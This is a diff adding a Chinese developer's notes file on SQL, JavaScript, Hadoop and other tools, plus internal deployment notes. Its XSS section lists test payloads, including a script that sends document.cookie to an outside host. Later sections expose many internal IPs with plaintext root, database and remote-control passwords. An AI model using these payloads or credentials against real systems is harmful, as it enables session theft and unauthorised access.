+  - IFNULL(MAX(requesttimeinfo.requesttimestamp), '') AS lastrequesttime,
+
+6. Case具有两种格式。简单Case函数和Case搜索函数。     
+    
+	SQL中的CASE WHEN用法
+	--简单Case函数
+	CASE sex      
+	    WHEN '1' THEN '男'      
+	    WHEN '2' THEN '女'      
+		ELSE '其他' 
+	END      
+	    
+	--Case搜索函数
+	CASE WHEN sex = '1' THEN '男'      
+	    WHEN sex = '2' THEN '女'      
+		ELSE '其他' 
+	END 
+	为了在 GROUP BY 块中使用 CASE，查询语句需要在 GROUP BY 块中重复 SELECT 块中的 CASE 块。
+
+7.  CHECK 约束用于限制列中的值的范围。http://www.runoob.com/sql/sql-check.html
+	如果对单个列定义 CHECK 约束，那么该列只允许特定的值。
+	如果对一个表定义 CHECK 约束，那么此约束会基于行中其他列的值在特定的列中对值进行限制。
+
+8.  创建用户
+	Create user 'admin'@'%' identified by 'admin123'
+
+9.  权限分配
+	grant 权限 on 数据库对象 to 用户
+	grant select, insert, update, delete on testdb.* to common_user@'%'
+	
+	1. grant, revoke 用户权限后，该用户只有重新连接 MySQL 数据库，权限才能生效。
+	2. 如果想让授权的用户，也可以将这些权限 grant 给其他用户，需要选项 “grant option“
+	grant select on testdb.* to dba@localhost with grant option;
+	
+	show grants; //查看当前用户（自己）权限
+	show grants for dba@localhost; //查看其他 MySQL 用户权限
+	
+	grant  all on *.* to   dba@localhost; //权限分配
+	revoke all on *.* from dba@localhost; //权限收回 revoke 关键字，把 to 改为 from
+
+10. // 对某个字段去重并统计不重复项的次数
+	select count(distinct fraudmdn) from ict_subject_fraudnumber_day where p_date='2016-06-12';
+	// 统计某字段各值的个数(次数)，group by 必不可少
+	select city, count(1) from ict_subject_othernetappqoe_day where p_date='2016-06-15' group by city;
+
+11. //mysql 查看版本号
+  show global variables like 'port';
+	show global variables like 'version';
+
+12. 备份数据库
+  mysqldump -hlocalhost -uroot -pdap1235ktz openapi > openapi_bakeup.sql
+  // 每天01：30定时备份数据库，可在/etc/crontab配置文件中加入下面代码行：
+  30 1 * * * root mysqldump -u root -pPASSWORD --all-databases | gzip > /mnt/disk2/database_`date '+%m-%d-%Y'`.sql.gz
+  date '+%m-%d-%Y'得到当前日期的MM-DD-YYYY格式
+
+  1、导出數據库為dbname的表结构（其中用戶名為root,密码為dbpasswd,生成的脚本名為db.sql）
+  mysqldump -uroot -pdbpasswd -d dbname >db.sql;
+
+  2、导出數據库為dbname某张表(test)结构
+  mysqldump -uroot -pdbpasswd -d dbname test>db.sql;
+
+  3、导出數據库為dbname所有表结构及表數據（不加-d）
+  mysqldump -uroot -pdbpasswd  dbname >db.sql;
+
+  4、导出數據库為dbname某张表(test)结构及表數據（不加-d）
+  mysqldump -uroot -pdbpasswd dbname test>db.sql;
+
+  5.数据还原
+  mysql -u用户名 -p密码 -h主机 数据库 < 路径
+
+13. 修改root用户密码
+  update mysql.user set password=password('openapi@12580') where user='root';
+  FLUSH PRIVILEGES;
+
+14. Host is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
+    原因；同一个ip在短时间内产生太多（超过mysql数据库max_connection_errors的最大值）中断的数据库连接而导致的阻塞；
+    解决：连接Mysql, 执行：flush hosts;
+    http://www.cnblogs.com/susuyu/archive/2013/05/28/3104249.html
+
+
+-----------------------MySQL End--------------------------
+
+-----------------------Excel Begin--------------------------
+
+1. 插入100000行随机数
+  - 第一步在地址框输入a100000;
+  - 第二步按住ctrl+shift+方向键上键选中所有单元格;
+  - 第三步在编辑框中输入rand函数；
+  - 第四步按ctrl+回车键。
+
+2. 在Excel - 选项 - 高级中有启用多线程计算的选项，还可以选择启用几个核
+
+-----------------------Excel End----------------------------
+
+-----------------------JS Begin--------------------------
+
+1. this传递
+  <a data='asdf' onclick='test(this)'></a> 
+  function test(target) {alert($(target).attr('data'));}
+
+2. event传递 
+  <a data='fdsa' onclick='test(event)'></a>
+  function test(event) {alert($(event.target).attr('data'));}
+
+3. document.getElementById('api-operation-model-trigger').click() 
+  与 $('#api-operation-model-trigger').click() 的区别？
+  - var domObj = document.getElementById('id-value') //DOM对象
+    得到的仅仅是那个dom对象。
+  - var $obj = $('#id-value') //jQuery对象,jQuery对象就是通过jQuery包装DOM对象后产生的对象，它是jQuery独有的。
+    得到jquery的对象，除了dom对象之外，还有事件处理对象，各种属性值和方法等等。
+  - DOM对象 与 jQuery对象之间的方法不能互用
+  - DOM对象 转换为 jQuery对象
+    var cr = document.getElementById("cr"); //dom对象
+    var $cr = $(cr); //转换成jquery对象
+  - jQuery对象 转换为 DOM对象
+    var $cr = $("#cr"); //jquery对象
+    var cr = $cr[0]; //dom对象，也可写成 var cr = $cr.get(0);
+  - $()函数就是一个jquery对象的制造工厂，如果获取的对象是 jquery对象，那么在变量前面加上$，这样方便容易识别出哪些是jquery对象。
+
+4. 以下四种方法仅仅表示一个死链接,都表示是一个死链接不会跳转也不会返回到顶部.(默认是点击链接后，页面会向上滚到页首)
+   void 运算符对表达式求值，并返回 undefined。在希望求表达式的值，但又不希望脚本的剩余部分看见这个结果时，该运算符最有用。
+  - <a href="####"></a>
+  - <a href="javascript:void(0)"></a>
+  - <a href="javascript:void(null)"></a>
+  - <a href="#" onclick="return false"></a>
+
+5. 隐藏元素 - display:none或visibility:hidden
+  - visibility:hidden可以隐藏某个元素，但隐藏的元素仍需占用与未隐藏之前一样的空间
+  - display:none可以隐藏某个元素，且隐藏的元素不会占用任何空间
+
+6. 判断checkbox是否被选中：$('#pm-auto-refresh').is(':checked');
+
+7. 定时器
+  - var interval = setInterval("loadPerformanceMonitorRecord()", 10000);  //定时执行多次
+    clearInterval(interval);   //清除Interval定时器
+  - var timeout = setTimeout("loadPerformanceMonitorRecord()", 10000);  //定时执行一次
+    clearTimeout(timeout);    //清除Timeout定时器
+
+8. div：指定渲染HTML的容器
+   span：指定内嵌文本容器, 是对普通的文本的一种容器
+   label：用于绑定一个表单元素, 当点击label标签的时候, 被绑定的表单元素就会获得输入焦点
+   
+9. for (var i in reqData) {} //该方式会造成 datatable 的 requested unknown parameter 警告
+
+10.
+	<head>
+		<meta http-equiv="X-UA-Compatible" content="IE=10">  //针对IE，使用IE10渲染模式渲染页面
+		<meta name="renderer" content="webkit">  //针对360浏览器，使360浏览器切换到webkit内核渲染页面
+	</head>
+
+11. JS 中的正则表达式匹配 http://www.w3school.com.cn/jsref/jsref_obj_regexp.asp
+	test() //返回true 或 false
+	search() //返回-1 或 第一次匹配的位置
+	match() //返回null 或 匹配到的字符串
+
+	var str = "abcdefghijk"
+	var patt = new RegExp("def") //相当于 var patt = /def/
+	var result = patt.test(str)
+
+12. var row = $(that).parent().attr('data_index'); //获取父元素的 data_index 的属性值。
+
+13. 字符串替换
+    var text = "this a test text";
+    text.replace("a", "A") //只会把第一个"a"替换为"A"
+    text.replace(/a/g, "A")  //全局把"a"替换为"A", g表示全局, i表示忽略大小写，可以gi组合使用
+
+14. JQuery读取Json对象，并使用foreach函数
+    var symbols = [{key:"a", value:1},
+                   {key:"b", value:2}]
+
+    $.each(symbols, function(index, item) {
+        if (index == 0) return;
+        alert("key is " + item.key + ", " + "value is " + item.value)
+    });
+
+15. 重写JQuery的val()方法
+    给$.prototype.val重新定义一个函数，以闭包的形式将基类函数传入，以便在新函数中调用它
+
+    $.prototype.val = function (base) {
+    return function () {
+      //val()函数是否传入参数，获取该参数
+      var object = this, isSetValue = arguments.length > 0, value = isSetValue ? arguments[0] : null;
+      //若有参数，修改其值
+      var newValue = isSetValue ? htmlDecode(value) : value
+      //根据是否有参数，调用基类方法
+      if (isSetValue && typeof(base) == "function") {
+        base.call(object, newValue)
+      } else {
+        base.call(object)
+      }
+    }
+    //该处传入基类的方法
+  }($.prototype.val)
+
+16. 函数设置默认参数
+  function example(a,b){
+    var a = arguments[0] ? arguments[0] : 1;//设置参数a的默认值为1
+    var b = arguments[1] ? arguments[1] : 2;//设置参数b的默认值为2
+    return a+b;
+  }
+  或者
+  function example(){
+    var a = arguments[0] ? arguments[0] : 1;//设置第一个参数的默认值为1
+    var b = arguments[1] ? arguments[1] : 2;//设置第二个参数的默认值为2
+    return a+b;
+  }
+
+  通过判断参数的类型来实现重载：
+  function foo(){   
+    if(typeof arguments[0] == 'string')    
+        alert('参数类型为字符串');    
+    else if(typeof arguments[0] == 'number')    
+        alert('参数类型为数值');    
+  }
+  或者
+  function foo(){   
+    if(arguments[0].constructor == String)    
+        alert('参数类型为字符串');    
+    else if(arguments[0].constructor == Number)    
+        alert('参数类型为数值');    
+  }
+
+17. var isChecked = $('#pm-auto-refresh').is(':checked');  //判断是否被勾选
+    $(target).siblings("input").prop("checked", false);  //取消checked
+    document.getElementById('myRadio').checked = false; 
+
+18. 选取第二个 <p> 元素：
+    $("p:eq(1)")
+    $("p").eq(1).css("background-color","yellow");
+
+19. style="z-index:-100;position: relative;"  //让元素置于最底层
+
+20. $.parseJSON( jsonstr ); 
+    JSON.parse(jsonstr); //可以将json字符串转换成json对象 
+    JSON.stringify(jsonobj); //可以将json对象转换成json对符串
+
+21. array.sort(function(x, y){return x.value < y.value}); //降序排序, array是一个数组
+
+23. http://www.jb51.net/article/39115.htm
+    $("#父窗口元素ID",window.parent.document); 
+    对应javascript版本为window.parent.document.getElementByIdx_x("父窗口元素ID")
+
+24. $("#test").is(":hidden")  //判断id为test的元素是否被隐藏
+
+25. JS数组的高阶函数(map/filter/forEach/every...)：http://www.cnblogs.com/xiao-hong/p/3194027.html
+
+
+-----------------------JS End--------------------------
+
+-----------------------Kafka Begin--------------------------
+1. 命令行操作
+  - ./bin/kafka-console-consumer.sh --zookeeper zdh1:2181 --topic xx_topic
+  - ./bin/kafka-console-producer.sh --broker-list 10.9.233.95:9092 --topic xx_topic
+
+-----------------------Kafka End--------------------------
+
+-----------------------Hadoop Begin--------------------------
+
+1. HDFS中DataNode备份策略(默认复本为3)
+  - 若client为DataNode节点，那存储block时，规则为：副本1，同client的节点上；副本2，不同机架节点上；副本3，同第二个副本机架的另一个节点上；其他副本随机挑选。
+  - 若client不为DataNode节点，那存储block时，规则为：副本1，随机选择一个节点上；副本2，不同副本1，机架上；副本3，同副本2相同的另一个节点上；其他副本随机挑选。
+
+
+-----------------------Hadoop End--------------------------
+
+-----------------------XSS Begin--------------------------
+1. xss 攻击介绍
+	http://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html
+	http://blog.csdn.net/yatere/article/details/6359521
+	XSS CHEAT SHEET: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+	https://technet.microsoft.com/en-us/library/cc512662.aspx
+	论文：http://www.docin.com/p-484361832.html
+
+2. 测试代码块
+	javascript:alert(1)
+	"></script><script>alert(/xss/)</script>
+	<iframe scr=http://baidu.com></iframe>
+	<script>alert(/xss/)</script>
+
+	<script>alert(123)</script>
+	“><script>alert(1)</script>
+	</style><script>alert(1)</script>
+	“)</script><script>alert(1)</script>
+	“><img src=”a”     onerror=”prompt”>
+
+	"/><script>alert(document.cookie)</script><!-
+	" onfocus="alert(document.cookie)
+	<script>window.open("http://www.asdf.com?cookie="+document.cookie)</script>
+
+3. 测试工具
+	ZAP: http://www.freebuf.com/sectool/5427.html
+	reflected_xss： https://www.91ri.org/8649.html
+	ratproxy: http://dbanotes.net/security/ratproxy_google_xss.html
+	11个免费的网站测试工具；http://www.cnblogs.com/hackchecker/archive/2012/01/08/2316531.html
+	Exploit-Me：火狐插件
+	fiddler + x5s: http://www.freebuf.com/articles/web/30960.html
+
+4. xss 攻击预防
+	原则：　不相信客户输入的数据
+	注意:  攻击代码不一定在<script></script>中
+
+	将重要的cookie标记为http only, 这样的话Javascript中的document.cookie语句就不能获取到cookie了.
+	只允许用户输入我们期望的数据。 例如：年龄的textbox中，只允许用户输入数字。 而数字之外的字符都过滤掉。
+	对数据进行Html Encode处理, Html Encode 对html代码进行编码，不让其在服务端运行。一旦检测到如'<'/'>'等这样的特殊字符，需要进行html encode
+	过滤或移除特殊的Html标签， 例如: <script>, <iframe> ,  &lt; for <, &gt; for >, &quot for
+	过滤JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。
+
+
+-----------------------XSS End--------------------------
+
+-----------------------Auto HotKey Begin--------------------------
+1. budlr.ahk
+  ^;::send {BackSpace}
+  ^i::send {Up}
+  ^k::send {Down}
+  ^j::send {Left}
+  ^l::send {Right}
+
+
+-----------------------Auto HotKey End--------------------------
+
+
+流量密度元数据日志文件路径
+/home/netnumen/ems/ums-server/utils/vmax-metadata-manager/submitSparkAppFile/lte_subject_fluxdensity_web_grid_week
+
+//sld的位置
+/home/netnumen/ems/ums-server/procs/ppus/webgis.ppu/webgis-web.pmu/webgis.ear/webgis.war/WEB-INF/classes/config
+/home/netnumen/ems/ums-server/procs/ppus/webgis.ppu/webgis-web.pmu/webgis.ear/webgis.war/WEB-INF/classes/config/sldtpl 
+
+用户投诉LTE正常话单RSRP指标的sld文件：lte_setuprsrpnormal_call.sld
+1./home/netnumen/ems/ums-server/procs/ppus/webgis.ppu/webgis-web.pmu/webgis.ear/webgis.war/WEB-INF/classes/config/sldtpl 在这个目录修改sld
+2./home/netnumen/ems/ums-server/procs/ppus/webgis.ppu/webgis-web.pmu/webgis.ear/webgis.war/WEB-INF/classes/config 删除这个目录对应的修改sld
+3./home/netnumen/ems/ums-server/procs/ppus/webgis.ppu/webgis-web.pmu/webgis.ear/webgis.war/WEB-INF/classes/config 删除这个目录下admin开头的相关sld
+4.重启webgis
+
+话务密度sld:
+lte_hourcalldur_heat.sld
+lte_hourcalldur_grids.sld
+lte_daycalldur_heat.sld
+lte_daycalldur_grids.sld
+
+webgis sld文件的svn路径：
+http://10.5.70.3/ZXVMAX/CODE/dev/ZXVMAX/vmax-app-ran/vmax-app-ran-tools/webgis-package/webgis-install/vmax-conf/sldtpl
+
+CDMA接入分析的sld文件：
+cdma_value_accessfailure_line.sld
+
+LTE接入分析
+lte_netmaxl_nbi_setupfailure_detail
+行键格式是 enbid后三位+enbid#cid#rrflag#时间戳
+
+
+覆盖类API功能测试URL：
+	1.demo地址：http://10.9.233.95:26180/vmaxadvanced/CoverageAPIDemo.html
+	2.定制POI区域：http://10.9.233.92:31180/odpp/vmax/api/coverage/poi/custom?poi=asdfasdf&poiType=1&province=sichuan&city=chengdu&coordinateID=0&points=104.05648427645372|30.71135433404512,104.0491213009751|30.70487768866257,104.06282235304934|30.704409937505552&sign=EDA10D511B9C62EE1F4FDD3BBB128560&appkey=owner2
+	3.查询POI信息：http://10.9.233.92:31180/odpp/vmax/api/coverage/poi/query?poiid=owner21456196098299&sign=EDA10D511B9C62EE1F4FDD3BBB128560&appkey=owner2
+
+GIS地图数据构造
+删除每行前20个字符，每行后面添加「，0」，第一行前面添加一行为「EarthID,Earth_X,Earth_Y,apicover」
+	sed -i 's@^.\{,2\}@@' test.file; sed -i 's/$/,0/' test.file; sed -i '1i\####' test.file
+
+版本机
+	(new)\\10.5.68.110\total\zxvmax_version
+	\\10.5.0.140\
+	\\10.5.0.140\zxvmax_version\V6.15.40.02
+	/home/version/dap
+	http://10.9.154.171/view/zxvmax_smoke/
+	/home/vmax/db_backup/sybase/logs
+发版本：
+	主机：10.9.185.150
+	用户名：root
+	密码：Bigdata123!
+	advanced-webapp/advanced-etl/data-storage：
+	/home/version/branch/V6.15.40.02P01/ictplugin
+
+
+易秀登录地址及参数(POST请求)
+http://share.zte.com.cn/tech/jsp/loginsubmit?password=xxx&remeber=true&language_flag=zh&language=zh&username=10192078
+
+//jekins，CI路径：10.9.185.150
+/home/jenkins/jobs/Vmax-API-Test-Interface-Test/
+
+元数据监控页面 vmax地址
+http://10.9.233.71:26180/vmaxmetadata/metaDataMonitor.html
+http://10.9.233.71:26180/vmaxmetadata/monitoring.html
+
+// 提交研究结果 - 研究结果
+问题：gis工具栏上有无用的按钮
+解决方法：去掉无用的按钮，只保留有用的
+引入版本：V6.15.60.02B2
+合入版本：V6.15.60.03B1
+
+//vmax-data-storage工程日志
+/home/netnumen/ems/ums-server/utils/vmax-data-storage/log
+
+合入代码：
+指派实施
+直到「验证通过待构建」才能合入代码
+步骤：(新建变更请求 - 指派变更实施 - 提交验证 - 验证通过待构建)
+
+故障处理：
+指派变更研究
+
+http://10.9.185.150/
+root
+Bigdata123!
+
+投诉查询
+cdma hbase待入库路径(datastorage扫描路径)
+/cdma/netmaxc/nbi_hbase_temp/
+LTE 相关路径
+/zxvmax/telecom/lte/netmaxl/nbi_hbase_temp
+
+河北mdnimsi对应表：ict_subject_imsimdn_day_hbase
+
+CDMA主题表位置
+/zxvmax/telecom/cdma/netmaxc/nbi/exception/cdma_netmaxc_nbi_exception_cdt_1x_qoe_accessfailurecall
+
+
+环境信息
+10.9.234.100 drs
+10.9.234.101 vmax
+10.9.234.107 hdfs
+10.9.234.108 hbase
+10.9.234.109 DAP
+10.9.234.110 Spark
+root  Zxvmax_3650
+
+元数据负责把hdfs目录/metadata/hdfs/webgispreprocess上的相关文件推到以下目录
+/home/netnumen/ems/ums-server/procs/ppus/webgis.ppu/webgis-web.pmu/webgis.ear/webgis.war/data/preprocess (WebGis异机部署情况下，vmax和webgis服务器都有存有)
+WebGis再从以上目录取数据生成图层数据文件，放在webgis所在服务器/home/webgisdata/grid相关路径下。
+
+//浙江现场环境信息
+ICT 192.233.3.18   Zxvmax_3650
+dap 192.233.3.1
+spark:192.233.3.2
+drs：192.233.3.17
+webgis：192.233.3.41  root123
+gbase1：192.233.3.38
+gbase2：192.233.3.40
+netmax:192.76.161.102（大网）   192.168.11.30（小网）   unipos2015
+NDS:192.76.161.7  root123
+
+//配置文件存放路径
+/home/netnumen/ems/ums-server/utils/api-interface-rest
+
+自动化测试天周月时间
+"hourtime=2016-05-1017",
+"daytime=2016-05-10",
+"weektime=2016-19",
+"monthtime=2016-04",
+
+接入失败详情表格数据(入库hbase前路径)
+hdfs dfs -du -h /cdma/netmaxc/nbi_hbase_temp/exception
+
+//元数据平台推送到数据到Gbase或WebGis的前的数据存放路径
+/metadata/hdfs/load2gbase
+/metadata/hdfs/webgispreprocess
+
+投诉查询
+lte_netmaxl_nbi_calldrop(hbase)
+lte_netmaxl_nbi_setupfailure(hbase)
+lte_netmaxl_nbi_calltrace(hbase)
+开拓者团队负责以上三张表的Hbase入库，入库的数据依赖于/zxvmax/telecom/lte/netmaxl/nbi_hbase_temp底下的数据，但是该目录为空，没有数据。
+
+
+流量密度的功能当天只能查看前天或更前的数据(如今天是8月9号，能查看8月7号及以前的数据)。
+
+//性能环境
+10.9.230.215 vmax root/root123
+10.9.230.229 spark
+10.9.230.173 dap
+通过这个ssh到199.168.10.6
+/data1/cdma/sourcecdmadata
+/data3/cdma/sourcecdmadata
+这两个里面
+
+环境信息：
+dap_ip: 10.9.233.98
+ict_ip: 10.9.233.103
+drs_ip: 10.9.233.103
+spark_ip: 10.9.233.102
+hbase_ip: 10.9.233.98
+gbase_ip: 10.9.233.103
+hdfs_ip: 10.9.233.103:50070
+username: root
+password: zxumts
+
+DAP Manager：10.9.233.19               root/root123
+VMAX（CN+RAN+Gbase） ：10.9.233.17           root/root123
+Spark Master&SQL：10.9.233.20  root/root123
+
+
+还有个hbase入库的配置项也可以关注一下：storage-tables.conf 中的 maxFileNum = 50，这个配置是每次处理待入库资源文件的最大个数，目前该环境配置的是50。 
+在之前做过测试，YARN资源被分配在50core/单机2g内存的情况下，maxFileNum = 200 改为200效率会更好。
+
+目前接入分析Hbase入库和用户投诉无线测数据Hbase入库的任务仍在vmax-data-storage这个工程里，其余任务在元数据平台下。
+
+环境信息：
+vmax 10.9.234.122
+dap  10.9.234.125
+spark 171.168.1.12
+hbase 171.168.1.15
+机器密码均为Zxvmax_3650
+
+环境信息
+ict:10.9.233.71              root / root123
+dap:10.9.233.74              root/smokeroot123     
+mysql:10.9.233.71            root / U_tywg_2013
+sparkmaster:10.9.233.74      root / smokeroot123
+sparksql：10.9.233.74        root / smokeroot123
+
+Gbase:10.9.233.71            root / root123
+hdfs: 10.9.233.73            root/root123
+hbase：10.9.233.74           root/root123
+vnc:10.9.233.71:1            root123
+vnc：10.9.233.74:1           root123
+
+
+//安峰 投诉查询话单上报
+CallTrace中记录要求话单的Release和Setup记录均存在，也即setup和release是完整的才会有calltrace输出。
+setupfailure中的部分记录是没有release的，所以不会在calltrace中出现。
+calldrop中的部分记录为非终释的掉话，也不会在calltrace中出现。
+接入时间完全一样的话单，看下话单的ID（UERecordID）是否一样，若不一样则是正常的，其实时间还有毫秒，毫秒级是不一样的，目前只是未输出毫秒级。
+
+//cdma和lte话单入库在元数据上的任务名
+mysql> select distinct taskname,virtualtaskname from task_board where description = 'kaituozhe' and virtualtaskname like '%netmaxtables%' and day='2016-08-26' order by taskname;
++---------------------------------------------------------------+------------------------------+
+| taskname                                                      | virtualtaskname              |
++---------------------------------------------------------------+------------------------------+
+| cdma_netmaxc_nbi_exception_cdt_1x_qoe_accessfailurecall_hbase | cdmanetmaxtablestohbase_task |
+| cdma_netmaxc_nbi_exception_cdt_1x_qoe_dropcall_hbase          | cdmanetmaxtablestohbase_task |
+| cdma_netmaxc_nbi_exception_cdt_1x_qoe_poorqualitycall_hbase   | cdmanetmaxtablestohbase_task |
+| cdma_netmaxc_nbi_exception_cdt_do_qoe_accessfailurecall_hbase | cdmanetmaxtablestohbase_task |
+| cdma_netmaxc_nbi_exception_cdt_do_qoe_dropcall_hbase          | cdmanetmaxtablestohbase_task |
+| cdma_netmaxc_nbi_exception_cdt_do_qoe_poorqualitycall_hbase   | cdmanetmaxtablestohbase_task |
+| cdma_netmaxc_nbi_rawdata_cdt_1x_hbase                         | cdmanetmaxtablestohbase_task |
+| cdma_netmaxc_nbi_rawdata_cdt_do_hbase                         | cdmanetmaxtablestohbase_task |
+| lte_netmaxl_nbi_calldrop_hbase                                | ltenetmaxtablestohbase_task  |
+| lte_netmaxl_nbi_calltrace_hbase                               | ltenetmaxtablestohbase_task  |
+| lte_netmaxl_nbi_setupfailure_hbase                            | ltenetmaxtablestohbase_task  |
++---------------------------------------------------------------+------------------------------+
+
+          ict/mysql   sparksql      kafka(group.id)   gbase库名
+主板本     96        93(zdh2)         dev              zxvmax
+5073       94        94(zdh3)         branch5073       apitest
+组件化     92        94(zdh3)         api-module       moduletest
+
+
+CDMA工参表：cdma_netmaxc_nbi_geoprojdata
+LTE工参表：lte_cm_projdata
+省市编码表：areadata
+
+gbase数据导入脚本路径
+/home/vmax/gbasedb
+
+dap中各组件的日志文件路径：/data1/zdh/
+
+grunt js构建工具
+
+10.9.233.48 root/yunjie123
+
+实验室反向代理
+http://10.9.235.248/store/pages/main/index.html
+
+
+[root@zdh1 ~]# 
+[root@zdh1 ~]# echo $MYSQL_HOME
+/home/mysql/mysql
+[root@zdh1 ~]# 
+[root@zdh1 ~]# export MYSQL_HOME=/home/netnumen/ems/mysql
+
+future 线程池大小：# forkjoinpool默认线程数 max(min(cpu线程数 * 3.0, 64), 8)
+
+在安装open-api之前，需要在vmax服务器、vmax集群以及open-api部署服务器彼此之间相互添加互信，互信通过ssh方式来添加。
+
+//解决互信   
+ssh -o "StrictHostKeyChecking no" 10.9.230.205
+
+VMAX原SVN文档库因空间不足已迁移，新链接地址 http://10.5.70.3/ZXVMAX_DOC/DOC
+
+去Spark里面查一个imsi既是3G又是4G：
+select * from ( select day, imsi, msisdn, terminal_model, count(*) as cc from union_singleuserevaluate_imsimdn_day where p_date='2016-09-22' group by day, imsi, msisdn, terminal_model ) a where cc > 1;
+
+
+//冒烟
+环境信息
+ict:10.9.233.71              root / root123
+dap:10.9.233.74              root/smokeroot123     
+mysql:10.9.233.71            root / U_tywg_2013
+sparkmaster:10.9.233.74      root / smokeroot123
+sparksql：10.9.233.74        root / smokeroot123
+
+Gbase:10.9.233.71            root / root123
+hdfs: 10.9.233.73            root/root123
+hbase：10.9.233.74           root/root123
+vnc:10.9.233.71:1            root123
+vnc：10.9.233.74:1           root123
+
+
+spark2.0环境
+10.9.233.85
+192.168.122.85
+hdfs,dap,loader,drs
+10.9.233.86
+192.168.122.86
+spark
+VMAX服务器（包含gbase）：
+10.9.233.31
+用户名密码统一为 root/root123
+
+环境信息：
+192.168.1.102 vmax102 10.9.230.178      DAP
+192.168.1.103 vmax103 10.9.230.156      SparkSQL
+192.168.1.105 vmax105 10.9.230.176      WebGIS/Gbase
+192.168.1.106 vmax106 10.9.230.237      ICT
+用户名密码：root/root123
+
+//spark2.0相关路径
+/opt/ZDH/parcels/sbin/sparksql_watchdog.py
+/etc/zdh/spark/conf.zdh.spark/spark-defaults.conf
+/opt/ZDH/parcels/lib/spark/sbin/start-thriftserver.sh
+
+select left(serialnum, 4) as serialnum, apigroup, sum(isonline) from api_product_info group by apigroup;
+
+select * from api_product_info where apigroup = '栅格'
+
+update api_product_info set isonline = 0 where apigroup = '业务'
+
+/home/mr/spark/bin/beeline -u "jdbc:hive2://vmax12:18000/" -n mr -p "" --maxwidth=3000
+
+  <property>
+    <name>hive.server2.authentication</name>
+    <value>CUSTOM</value>
+  </property>
+  <property>
+    <name>hive.server2.custom.authentication.class</name>
+    <value>com.zte.bigdata.api.auth.CustomHiveServer2Auth</value>
+  </property>
+  <property>
+    <name>hive.server2.custom.authentication.file</name>
+    <value>/home/mr/spark/conf/hive.server2.users.conf</value>
+  </property>
+
+
+环比：是今年本期（如10月）指标与今年上期（如9月）指标之比。 
+同比：是今年本期（如10月）指标与上年本期（如10月）指标之比。
+
+
+流量密度单位是MB，就是汇聚所有在这个区域内的业务流量得出
+话务密度是千小时，是汇聚这个区域内所有业务进行的时间得出
+
+
+10.9.234.39  root/Zxvmax_3650
+/home/netnumen/ems/ums-server/utils/vmax-data-storage/log/datastorage.log
+
+
+远控环境：
+福建现场Teamview：940650660/1751、207259808/732pcq
+贵州：936397234/123456、312945352/123456
+      ICT: 100.66.93.87 admin/bigdata
+山西联通：账号：708977606  密码：7637
+重庆联通：612167694/rc12345678、745601784/4kh69f
+          745601784/tilv48
+          ICT: 10.110.1.162
+          DAP: 10.110.1.164
+河南联通(7001)：424877865/111111、261493585/123456
+          ICT：192.168.129.23
+河南移动(7001)：704289486/123456
+          ICT: 10.92.185.230
+          DAP: 10.92.185.231
+广州移动(7001)：215 231 322/7374
+                664860020/7335
+                192.168.129.17是HBASE  192.168.129.12是vmax，
+                root/Zxvmax_3650 
+河北：166155184/zuj551
+
+
+10.9.234.69  root 密码改成了  ktz1235
+
+http://10.5.70.3/ZXVMAX_DOC/DOC/ZXVMAX（V6.15）/05 敏捷团队开发过程文档/02 开拓者/书籍类分享/Top100PPT.zip
+
+分布式：一个业务分拆多个子业务，部署在不同的服务器上
+集群：同一个业务，部署在多个服务器上
+
+
+贵州Data-Storage
+V6.15.60.02\vmax-app-ran\vmax-data-storage\src\main\scala\com\zte\bigdata\vmax\data\storage\HBaseImport\hbaseImportSsh.scala
+Line 199:  val waitTimeCnt = 45 * 60 * 1000 / timeMilliseconds
+日志：
+HBase Import[cdma_netmaxc_nbi_rawdata_cdt_do] total file num:100, total file size:5265 M
+HBase Import complete[cdma_netmaxc_nbi_rawdata_cdt_do],some lines are bad, input records: 10965578, Bad Lines: 1864691, badRatio: 0.170
+
+在  /home/netnumen/ems/ums-server/utils/vmax-conf/serviceaddress.properties  修改如下两项配置为：
+HBaseImport.maxFileNum = 150
+HBaseImport.maxDataSize = 8000
+
+-------------Hbase入库---------------
+
+/home/vmax/file/ran/conf/silence-conf-normal.xml
+/home/vmax/file/ran/conf/silence-conf-delta.xml
+
+HBase入库，我们用到了两种不同的方式，data-storage工程里入库的表用的是bulkload方式，迁移到元数据vmax-etl里入库的表用的是Spark 方式。
+最近的优化工作主要是确认了迁移到元数据用的Spark方式入库的机制和原理，以及影响其入库效率的一些因素。
+
+1、对现在主要用的vmax-etl里的Spark方式，最近确认这种方式是通过Spark RDD调用HBase put API来入库的，其机制和原理完全不同于以前的bulkload方式。
+影响其入库效率的主要是Spark入库任务的资源分配和HBase集群put的性能。由于我们用到的HBase表，数据量大小相差悬殊，如何调整相关参数，使得性能较优，还在分析当中；特别是各参数之间的数量关系，还需要测试验证。
+
+现在得到的两个阶段性结论是：
+1）特性团队对于数据量比较大的表，其初始region数量一定要多些，不能都用默认值，要单独用参数配置（region数量可单独配置这点元数据应该已经支持了），这已经和开拓者说明了。
+      对已经在使用的HBase表，需要增加region数量，同时又要求保留HBase表的数据的，可以通过Hbase脚本进行手工增加region数量。
+2）元数据需要控制并发入库任务的数量，包括同一个表的任务和不同表的任务，可并发的数量分别通过参数控制。这是因为对锁的争夺会影响效率；
+     另外由于HBase本身固有的HFile文件合并机制等因素，在某些时段，HBase put的性能难免会有些下降，如果对并发数量不加控制，就可能会加剧性能的下降。
+
+PS： Spark方式入库是开拓者同事在成都现场为了将ORC格式的文件导入HBase引入的，之前对这种方式的机制比较模糊；最开始在成都用这种方式入库的表不是很多，随着越来越多的表改用这种方式入库，对HBase集群put的性能要求也越来越高了。
+
+2、对以前的bulkload方式，是通过Yarn MapReduce将入库记录生成HBase的HFile数据文件再直接加载到HBase的。这是我本人做老UMTS的时候最开始做的，最初就咨询DAP同事优化过了的。
+对这种方式现在存在的问题，应该是缺少一个给外场同事和测试同事调整配置参数的方法说明，也就是根据各环境的数据量、集群的资源去调整Yarn相关配置参数和VMax HBase入库相关参数的方法说明。
+当然，要给出一个简单方便的操作说明还是有难度的，之前在深圳联通、山东联通、成都都是我们研发自己或者和现场同事反复沟通尝试着调整的。
+
+最后再补充一点，VMax用到HBase的功能相对Spark说偏少，但Hbase本身还是一个很复杂的组件，加上入库方式的改变，涉及的东西就多了。
+如果希望HBase集群的性能高效稳定可靠，真正达到可商用级别，我们还有不少事情要做。
+
+
